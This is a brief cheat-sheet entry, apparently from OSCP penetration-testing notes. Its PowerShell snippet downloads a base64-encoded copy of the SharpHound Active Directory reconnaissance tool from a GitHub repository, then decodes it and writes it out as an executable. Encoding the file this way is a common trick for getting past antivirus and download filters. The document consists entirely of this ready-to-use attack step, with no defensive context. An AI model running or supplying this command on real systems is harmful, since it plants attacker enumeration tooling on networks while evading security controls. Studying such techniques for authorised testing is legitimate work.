# DOWNLOAD - SHARPHOUND
```
curl https://github.com/n0ts0cial/oscp/raw/main/base64/SharpHound.txt -outfile SharpHound.txt
$Filename = ".\SharpHound.txt"
$Filecontent = Get-Content $Filename -raw;
$decoded = [System.Convert]::FromBase64String($Filecontent)
Set-Content SharpHound.exe -Value $decoded -Encoding Byte
```
